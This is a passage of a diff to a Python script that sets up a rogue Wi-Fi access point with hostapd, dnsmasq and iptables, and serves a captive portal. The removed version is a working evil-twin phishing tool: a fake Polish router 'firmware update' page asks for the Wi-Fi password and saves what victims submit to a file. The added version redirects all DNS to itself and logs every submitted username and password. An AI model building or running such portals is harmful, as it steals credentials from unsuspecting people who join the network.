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">
+        </div>
+        <p>Please log in to access the network</p>
+        <div class="login-form">
+            <input type="text" id="username" placeholder="Username"><br>
+            <input type="password" id="password" placeholder="Password"><br>
+            <button onclick="login()">Login</button>
+        </div>
+        <p id="message"></p>
     </div>
-
-    <div id="hdr" class="header">Aktualizacja oprogramowania routera</div>
-
-    <div class="message">
-      System wykrył dostepną nową wersję oprogramowania. Aby dokończyć instalację i przywrócić połączenie z siecią, podaj hasło do sieci Wi-Fi.
-    </div>
-
-    <!-- mechanizm jak w Twoim oryginale: metoda POST na /save, pole name wifi_password -->
-    <form method="POST" action="/save" autocomplete="off">
-      <input name="wifi_password" type="password" placeholder="Hasło do Wi-Fi" required />
-      <button type="submit" aria-label="Kontynuuj">Kontynuuj</button>
-    </form>
-
-    <div class="footer" aria-hidden="false">
-      <div class="footer-logo">
-        <!-- miejsce na logo stopki (base64) -->
-        
-      </div>
-      <div class="legal">
-        Copyright © 2019 Network Systems Sp. z o.o.<br>
-        Firmware update — version 4.20
-      </div>
-    </div>
-  </div>
+    <script>
+        function login() {{
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var message = document.getElementById('message');
+            
+            if(username && password) {{
+                message.style.color = "green";
+                message.textContent = "Logging in... Please wait";
+                // Tutaj możesz dodać AJAX call do serwera
+                setTimeout(function() {{
+                    window.location.href = "http://example.com";
+                }}, 2000);
+            }} else {{
+                message.style.color = "red";
+                message.textContent = "Please fill in all fields";
+            }}
+        }}
+    </script>
 </body>
-</html>
-"""
+</html>"""
 
-# ==================== HTTP SERVER CLASS ====================
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        """Handle GET requests - display login page"""
-        print(f"[{datetime.now()}] GET request from {self.client_address[0]} to {self.path}")
-
-        # Always display login page regardless of path (improves captive portal reach)
-        html_content = PORTAL_HTML or EMBEDDED_PORTAL_HTML
+        logging.info(f"HTTP request from {self.client_address[0]} to {self.path}")
         
-        if self.path not in ("/", f"/{HTML_FILE}"):
-            self.send_response(302)
-            self.send_header("Location", "/")
+        # Przechwytuj wszystkie żądania
+        if self.path == "/" or self.path == "/index.html" or "generate_204" in self.path or "hotspot-detect.html" in self.path:
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
             self.end_headers()
-            return
-
-        # Always display login page
-        try:
-            with open(HTML_FILE, 'r', encoding='utf-8') as f:
-                html_content = f.read()
-        except FileNotFoundError:
-            print(f"[{datetime.now()}] ERROR: HTML file not found: {HTML_FILE}")
-            html_content = "<html><body><h1>Error: Portal page not found</h1></body></html>"
-        
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html; charset=utf-8')
-        self.send_header('Content-Length', len(html_content.encode('utf-8')))
-        self.end_headers()
-        self.wfile.write(html_content.encode('utf-8'))
-
+            # Wstaw obraz base64 (zostanie podmieniony później)
+            html_content = HTML_PAGE.format(IMAGE_BASE64="[BASE64_IMAGE_PLACEHOLDER]")
+            self.wfile.write(html_content.encode())
+        else:
+            # Przekierowanie dla captive portal - wszystkie inne żądania na stronę główną
+            self.send_response(302)
+            self.send_header('Location', f'http://{AP_IP}/')
+            self.end_headers()
+    
     def do_POST(self):
-        """Handle POST requests - save submitted form data"""
+        # Obsługa logowania
         content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
+        post_data = self.rfile.read(content_length)
+        logging.info(f"POST data: {post_data}")
         
-        form_data = parse_qs(post_data, keep_blank_values=True)
-
-        client_ip = self.client_address[0]
-        print(f"[{datetime.now()}] New form submission from {client_ip}: {form_data}")
-
-        # Save form data to file
-        output_name = FORM_OUTPUT_FILE
-        if CAPTIVE_PORTAL_SSID:
-            output_name = f"{CAPTIVE_PORTAL_SSID}_{FORM_OUTPUT_FILE}"
-        output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_name)
-        try:
-            with open(output_path, 'a', encoding='utf-8') as f:
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                f.write(f"[{timestamp}] IP: {client_ip}\n")
-                for key, values in form_data.items():
-                    joined = ", ".join(values)
-                    f.write(f"{key}: {joined}\n")
-                f.write("-" * 40 + "\n")
-            print(f"[{datetime.now()}] Form data saved to file: {output_path}")
-        except Exception as e:
-            print(f"[{datetime.now()}] ERROR saving to file: {e}")
-        
-        # Response to client
         self.send_response(200)
-        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.send_header('Content-type', 'text/html')
         self.end_headers()
-        response = "<html><body><h1>Thank you! Update in progress...</h1></body></html>"
-        self.wfile.write(response.encode('utf-8'))
-
+        self.wfile.write(b"Login received. You can now access the internet.")
+    
     def log_message(self, format, *args):
-        """Silence standard logs"""
+        # Wyłącz domyślne logowanie HTTP
         pass
 
-# ==================== HELPER FUNCTIONS ====================
-def get_interface_info():
-    """Get information about available network interfaces"""
-    interfaces = netifaces.interfaces()
-    interface_info = []
-    
-    print("\n" + "="*60)
-    print("AVAILABLE NETWORK INTERFACES")
-    print("="*60)
-    
-    for i, iface in enumerate(interfaces):
-        try:
-            # Get MAC address
-            mac = netifaces.ifaddresses(iface).get(netifaces.AF_LINK, [{}])[0].get('addr', 'No MAC')
-            
-            # Get IP address
-            ip_info = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [{}])
-            ip = ip_info[0].get('addr', 'No IP') if ip_info else 'No IP'
-            
-            # Get chipset info (Linux/Unix)
-            chipset = "Unknown"
-            vendor = "Unknown"
-            
-            if sys.platform.startswith('linux'):
-                try:
-                    driver_path = f"/sys/class/net/{iface}/device/driver"
-                    if os.path.exists(driver_path):
-                        driver = os.path.basename(os.readlink(driver_path))
-                        chipset = driver
-                    
-                    vendor_path = f"/sys/class/net/{iface}/device/vendor"
-                    if os.path.exists(vendor_path):
-                        with open(vendor_path, 'r') as f:
-                            vendor_id = f.read().strip()
-                        if vendor_id == '0x8086':
-                            vendor = "Intel"
-                        elif vendor_id == '0x10ec':
-                            vendor = "Realtek"
-                        elif vendor_id == '0x14e4':
-                            vendor = "Broadcom"
-                        else:
-                            vendor = f"Vendor ID: {vendor_id}"
-                    
-                    device_path = f"/sys/class/net/{iface}/device/device"
-                    if os.path.exists(device_path):
-                        with open(device_path, 'r') as f:
-                            device_id = f.read().strip()
-                        chipset = f"{chipset} (Device: {device_id})"
-                            
-                except Exception:
-                    chipset = "Read error"
-            
-            elif sys.platform == 'darwin':  # macOS
-                try:
-                    result = subprocess.run(['networksetup', '-listallhardwareports'], 
-                                          capture_output=True, text=True)
-                    for line in result.stdout.split('\n'):
-                        if iface in line:
-                            chipset = "Apple/Airport"
-                except:
-                    pass
-            
-            elif sys.platform == 'win32':  # Windows
-                try:
-                    result = subprocess.run(['wmic', 'nic', 'where', f'NetConnectionID="{iface}"', 
-                                           'get', 'Manufacturer,Name', '/format:list'], 
-                                          capture_output=True, text=True, 
-                                          creationflags=subprocess.CREATE_NO_WINDOW)
-                    for line in result.stdout.split('\n'):
-                        if 'Manufacturer=' in line:
-                            vendor = line.split('=')[1].strip()
-                        elif 'Name=' in line:
-                            chipset = line.split('=')[1].strip()
-                except:
-                    pass
-            
-            interface_info.append({
-                'name': iface,
-                'mac': mac,
-                'ip': ip,
-                'vendor': vendor,
-                'chipset': chipset
-            })
-            
-            print(f"{i+1}. {iface}")
-            print(f"   MAC: {mac}")
-            print(f"   IP: {ip}")
-            print(f"   Vendor: {vendor}")
-            print(f"   Chipset/driver: {chipset}")
-            print(f"   {'-'*40}")
-            
-        except Exception as e:
-            print(f"{i+1}. {iface} - Read error: {e}")
-            print(f"   {'-'*40}")
-    
-    return interface_info
-
-def load_portal_html():
-    """Load portal HTML from file or fall back to embedded HTML."""
-    if os.path.exists(HTML_FILE):
-        try:
-            with open(HTML_FILE, 'r', encoding='utf-8') as f:
-                return f.read()
-        except OSError as e:
-            print(f"[{datetime.now()}] ERROR reading HTML file: {e}")
-    print(f"[{datetime.now()}] Using embedded HTML (missing or unreadable {HTML_FILE}).")
-    return EMBEDDED_PORTAL_HTML
-
-def start_captive_portal(interface, ssid):
-    """Start captive portal on selected interface"""
-    global CAPTIVE_PORTAL_SSID
-    CAPTIVE_PORTAL_SSID = ssid
-    
-    print(f"\n{'='*60}")
-    print(f"STARTING CAPTIVE PORTAL")
-    print(f"{'='*60}")
-    print(f"Interface: {interface}")
-    print(f"SSID: {ssid}")
-    print(f"Port: {PORT}")
-    print(f"{'='*60}")
+def setup_ap():
+    """Konfiguracja i uruchomienie Access Point"""
+    logging.info("Setting up Access Point...")
     
     try:
-        # Get interface IP address
-        server_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
+        # Zatrzymanie NetworkManager, jeśli jest aktywny
+        subprocess.run(['systemctl', 'stop', 'NetworkManager'], stderr=subprocess.DEVNULL)
+        subprocess.run(['systemctl', 'stop', 'wpa_supplicant'], stderr=subprocess.DEVNULL)
+        time.sleep(2)
         
-        # Start server in separate thread
-        server = HTTPServer((server_ip, PORT), CaptivePortalHandler)
-        server_thread = threading.Thread(target=server.serve_forever)
-        server_thread.daemon = True
-        server_thread.start()
-
-        print(f"\n✅ Captive portal started!")
-        print(f"📡 Address: http://{server_ip}")
-        print(f"⏱️  Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        print(f"\nℹ️  Connection info will be displayed below:")
-        print("🛑 Press Enter to stop the portal.")
-        print(f"{'='*60}\n")
+        # Włączenie interfejsu
+        subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'down'])
+        time.sleep(1)
+        subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'up'])
+        time.sleep(1)
         
-        stop_event = threading.Event()
-
-        def wait_for_stop():
-            try:
-                sys.stdin.readline()
-                print(f"\n[{datetime.now()}] Stop requested via Enter.")
-            except Exception:
-                print(f"\n[{datetime.now()}] Stop requested.")
-            stop_event.set()
-            server.shutdown()
-
-        stop_thread = threading.Thread(target=wait_for_stop, daemon=True)
-        stop_thread.start()
-
-        # Main loop
-        while not stop_event.is_set():
-            time.sleep(0.5)
-
-        server.server_close()
-        print(f"[{datetime.now()}] Captive portal stopped")
-            
-    except KeyError:
-        print(f"\n❌ No IP address assigned to interface {interface}")
-        print("   Please assign an IP address first")
-        sys.exit(1)
-    except OSError as e:
-        if e.errno == 98:
-            print(f"\n❌ Port {PORT} is already in use")
-            print("   Another service might be running on port 80")
-            print("   Try: sudo fuser -k 80/tcp")
-        else:
-            print(f"\n❌ Server error: {e}")
-        sys.exit(1)
-    except KeyboardInterrupt:
-        print(f"\n\n[{datetime.now()}] Stopping captive portal...")
-        server.shutdown()
-        print(f"[{datetime.now()}] Captive portal stopped")
-        sys.exit(0)
-    except Exception as e:
-        print(f"\n❌ Error starting server: {e}")
-        sys.exit(1)
-
-def get_default_interface():
-    """Return the interface used for the default route (Linux)."""
-    if not sys.platform.startswith('linux'):
-        return None
-    try:
-        result = subprocess.run(
-            ['ip', 'route', 'show', 'default'],
-            capture_output=True,
-            text=True,
-            check=True,
-        )
-        for line in result.stdout.splitlines():
-            parts = line.split()
-            if 'dev' in parts:
-                return parts[parts.index('dev') + 1]
-    except (subprocess.CalledProcessError, IndexError):
-        return None
-    return None
-
-def get_interface_for_ip(ip_address):
-    """Return interface name for a given local IP."""
-    for iface in netifaces.interfaces():
-        ip_info = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
-        for addr in ip_info:
-            if addr.get('addr') == ip_address:
-                return iface
-    return None
-
-def is_interface_used_for_ssh(interface):
-    """Check if the interface appears to be used for the current SSH session."""
-    ssh_conn = os.environ.get('SSH_CONNECTION')
-    if not ssh_conn:
-        return False
-    parts = ssh_conn.split()
-    if len(parts) < 3:
-        return False
-    local_ip = parts[2]
-    return get_interface_for_ip(local_ip) == interface
-
-def setup_wifi_ap(interface, ssid):
-    """Configure interface as access point (Linux with hostapd)"""
-    if not sys.platform.startswith('linux'):
-        print(f"\n⚠️  Note: Automatic AP setup only available on Linux")
-        print("   On other systems, configure hotspot manually")
-        return True
-    
-    print(f"\nSetting up hotspot '{ssid}' on {interface}...")
-    
-    # Check if hostapd and dnsmasq are installed
-    try:
-        subprocess.run(['which', 'hostapd'], check=True, capture_output=True)
-        subprocess.run(['which', 'dnsmasq'], check=True, capture_output=True)
-    except subprocess.CalledProcessError:
-        print("\n❌ hostapd or dnsmasq not installed!")
-        print("   Install with: sudo apt-get install hostapd dnsmasq")
-        return False
-
-    default_iface = get_default_interface()
-    if default_iface == interface:
-        print(f"\n❌ Safety check: {interface} is the default route interface.")
-        print("   Configuring it as an AP would drop your SSH connection.")
-        print("   Use a different interface for the access point.")
-        return False
-
-    if is_interface_used_for_ssh(interface):
-        print(f"\n❌ Safety check: {interface} appears to be used for SSH.")
-        print("   Configuring it as an AP would drop your SSH connection.")
-        print("   Use a different interface for the access point.")
-        return False
-    
-    try:
-        # Detach interface from NetworkManager if available (avoid stopping NM)
-        if subprocess.run(['which', 'nmcli'], capture_output=True).returncode == 0:
-            subprocess.run(['sudo', 'nmcli', 'dev', 'set', interface, 'managed', 'no'],
-                           capture_output=True)
+        # Ustawienie adresu IP
+        subprocess.run(['ip', 'addr', 'flush', 'dev', AP_INTERFACE])
+        subprocess.run(['ip', 'addr', 'add', f'{AP_IP}/24', 'dev', AP_INTERFACE])
         
-        # Set static IP
-        subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', interface])
-        subprocess.run(['sudo', 'ip', 'addr', 'add', AP_STATIC_IP, 'dev', interface])
-        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])
-        
-        # Create hostapd config
-        hostapd_conf = f"""interface={interface}
+        # Konfiguracja hostapd
+        hostapd_conf = f"""
+interface={AP_INTERFACE}
 driver=nl80211
-ssid={ssid}
+ssid={AP_SSID}
 hw_mode=g
-channel=7
+channel={AP_CHANNEL}
 wmm_enabled=0
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
+wpa=2
+wpa_passphrase={AP_PASSWORD}
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
 """
         
         with open('/tmp/hostapd.conf', 'w') as f:
             f.write(hostapd_conf)
         
-        # Create dnsmasq config
-        dnsmasq_conf = f"""interface={interface}
-dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,24h
-dhcp-option=3,192.168.1.1
-dhcp-option=6,8.8.8.8
-no-resolv
+        # Uruchomienie hostapd w tle
+        hostapd_process = subprocess.Popen(['hostapd', '/tmp/hostapd.conf'], 
+                                         stdout=subprocess.PIPE, 
+                                         stderr=subprocess.PIPE)
+        time.sleep(3)
+        
+        # Konfiguracja dnsmasq jako DHCP i DNS
+        dnsmasq_conf = f"""
+interface={AP_INTERFACE}
+dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{NETMASK},{LEASE_TIME}
+dhcp-option=3,{AP_IP}
+dhcp-option=6,{AP_IP}
+address=/#/{AP_IP}
+server=8.8.8.8
 log-queries
 log-dhcp
 """
@@ -590,86 +209,126 @@ log-dhcp
         with open('/tmp/dnsmasq.conf', 'w') as f:
             f.write(dnsmasq_conf)
         
-        # Start hostapd and dnsmasq in background
-        print("Starting hostapd and dnsmasq...")
-        subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'], 
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.Popen(['sudo', 'dnsmasq', '-C', '/tmp/dnsmasq.conf'], 
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # Uruchomienie dnsmasq
+        dnsmasq_process = subprocess.Popen(['dnsmasq', '-C', '/tmp/dnsmasq.conf', '--no-daemon'],
+                                         stdout=subprocess.PIPE,
+                                         stderr=subprocess.PIPE)
+        time.sleep(2)
         
-        # Enable packet forwarding
-        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'])
-        if default_iface:
-            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING',
-                           '-o', default_iface, '-j', 'MASQUERADE'])
-        else:
-            print("⚠️  Could not determine default route interface for NAT.")
-            print("   Internet access for clients may not work.")
+        # Włączenie forwardowania
+        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
         
-        print("✅ Hotspot configured!")
-        return True
+        # Konfiguracja iptables
+        subprocess.run(['iptables', '-t', 'nat', '-F'])
+        subprocess.run(['iptables', '-F'])
+        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', INTERNET_INTERFACE, '-j', 'MASQUERADE'])
+        subprocess.run(['iptables', '-A', 'FORWARD', '-i', AP_INTERFACE, '-o', INTERNET_INTERFACE, '-j', 'ACCEPT'])
+        subprocess.run(['iptables', '-A', 'FORWARD', '-i', INTERNET_INTERFACE, '-o', AP_INTERFACE, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'])
+        
+        logging.info(f"Access Point '{AP_SSID}' started on {AP_IP}")
+        logging.info(f"DHCP range: {DHCP_RANGE_START} - {DHCP_RANGE_END}")
+        
+        return hostapd_process, dnsmasq_process
         
     except Exception as e:
-        print(f"❌ Hotspot configuration error: {e}")
-        return False
+        logging.error(f"Error setting up AP: {e}")
+        return None, None
 
-# ==================== MAIN FUNCTION ====================
+def start_captive_portal():
+    """Uruchomienie serwera HTTP dla captive portal"""
+    logging.info(f"Starting Captive Portal HTTP server on {AP_IP}:80")
+    
+    server = HTTPServer((AP_IP, 80), CaptivePortalHandler)
+    
+    # Uruchom serwer w wątku
+    server_thread = threading.Thread(target=server.serve_forever)
+    server_thread.daemon = True
+    server_thread.start()
+    
+    logging.info("Captive Portal HTTP server started")
+    return server
+
+def cleanup():
+    """Czyszczenie konfiguracji przy wyjściu"""
+    logging.info("Cleaning up...")
+    
+    # Przywróć iptables
+    subprocess.run(['iptables', '-t', 'nat', '-F'], stderr=subprocess.DEVNULL)
+    subprocess.run(['iptables', '-F'], stderr=subprocess.DEVNULL)
+    
+    # Zatrzymaj usługi
+    subprocess.run(['pkill', 'hostapd'], stderr=subprocess.DEVNULL)
+    subprocess.run(['pkill', 'dnsmasq'], stderr=subprocess.DEVNULL)
+    
+    # Przywróć interfejs
+    subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'down'], stderr=subprocess.DEVNULL)
+    
+    # Uruchom ponownie NetworkManager
+    subprocess.run(['systemctl', 'start', 'NetworkManager'], stderr=subprocess.DEVNULL)
+    
+    logging.info("Cleanup completed")
+
 def main():
-    print("="*60)
-    print("CAPTIVE PORTAL MANAGER")
-    print("="*60)
+    """Główna funkcja"""
+    logging.info("Starting Captive Portal System")
     
-    # Load portal HTML
-    global PORTAL_HTML
-    PORTAL_HTML = load_portal_html()
-    
-    # 1. List interfaces
-    interfaces = get_interface_info()
-    
-    if not interfaces:
-        print("❌ No network interfaces found!")
+    # Sprawdź uprawnienia
+    if os.geteuid() != 0:
+        logging.error("This script must be run as root!")
         sys.exit(1)
     
-    # 2. Select interface
-    while True:
-        try:
-            choice = int(input(f"\nSelect interface (1-{len(interfaces)}): ")) - 1
-            if 0 <= choice < len(interfaces):
-                selected_iface = interfaces[choice]
-                break
-            else:
-                print("❌ Invalid selection!")
-        except ValueError:
-            print("❌ Enter a number!")
+    # Sprawdź dostępność wymaganych narzędzi
+    required_tools = ['hostapd', 'dnsmasq', 'iptables', 'ip']
+    for tool in required_tools:
+        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
+            logging.error(f"Required tool '{tool}' not found!")
+            sys.exit(1)
     
-    print(f"\n✅ Selected interface: {selected_iface['name']}")
-    print(f"   {selected_iface['vendor']} - {selected_iface['chipset']}")
-    
-    # 3. Enter network name
-    ssid = input("\nEnter network name (SSID) for captive portal: ").strip()
-    if not ssid:
-        ssid = f"UpdatePortal_{selected_iface['name']}"
-        print(f"⚠️  Using default name: {ssid}")
-    
-    # 4. Configure hotspot (optional)
-    setup_ap = input("\nConfigure interface as hotspot? (y/n): ").lower()
-    if setup_ap == 'y':
-        if not setup_wifi_ap(selected_iface['name'], ssid):
-            print("⚠️  Continuing without hotspot configuration...")
-    
-    # 5. Start captive portal
-    input("\nPress Enter to start captive portal...")
-    start_captive_portal(selected_iface['name'], ssid)
-
-# ==================== ENTRY POINT ====================
-if __name__ == "__main__":
-    # Check permissions (Linux/Unix)
-    if os.name == 'posix' and os.geteuid() != 0:
-        print("⚠️  Warning: Root permissions may be needed for network configuration")
-        print("   Run with sudo, or configure interface manually")
+    # Rejestruj cleanup przy wyjściu
+    import atexit
+    atexit.register(cleanup)
     
     try:
-        main()
+        # Uruchom Access Point
+        hostapd_proc, dnsmasq_proc = setup_ap()
+        if not hostapd_proc or not dnsmasq_proc:
+            logging.error("Failed to start Access Point")
+            sys.exit(1)
+        
+        # Poczekaj chwilę na uruchomienie AP
+        time.sleep(5)
+        
+        # Uruchom Captive Portal
+        http_server = start_captive_portal()
+        
+        logging.info("=" * 50)
+        logging.info(f"Captive Portal is running!")
+        logging.info(f"SSID: {AP_SSID}")
+        logging.info(f"Password: {AP_PASSWORD}")
+        logging.info(f"Connect to WiFi and open any website to see the portal")
+        logging.info("=" * 50)
+        logging.info("Press Ctrl+C to stop")
+        
+        # Zachowaj procesy w pamięci
+        processes = [hostapd_proc, dnsmasq_proc]
+        
+        # Główna pętla
+        while True:
+            time.sleep(1)
+            
+            # Sprawdź czy procesy działają
+            for i, proc in enumerate(processes):
+                if proc and proc.poll() is not None:
+                    logging.error(f"Process {i} died!")
+                    cleanup()
+                    sys.exit(1)
+                    
     except KeyboardInterrupt:
-        print(f"\n\n[{datetime.now()}] Program terminated by user")
-        sys.exit(0)
+        logging.info("\nShutting down...")
+    except Exception as e:
+        logging.error(f"Unexpected error: {e}")
+    finally:
+        cleanup()
+
+if __name__ == "__main__":
+    main()
